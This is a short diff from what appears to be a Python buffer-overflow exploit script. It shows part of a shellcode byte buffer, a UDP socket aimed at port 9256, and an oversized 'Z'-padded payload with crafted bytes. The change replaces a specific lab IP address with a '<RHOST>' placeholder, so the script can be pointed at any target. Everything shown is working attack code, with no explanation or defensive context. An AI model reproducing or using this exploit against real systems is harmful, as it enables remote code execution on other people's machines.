@@ -80,7 +80,7 @@ buf += b"\x4b\x4f\x67\x65\x41\x41"
 
 # Create a UDP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-server_address = ('10.129.240.201', 9256)
+server_address = ('<RHOST>', 9256)
 
 fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
 p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
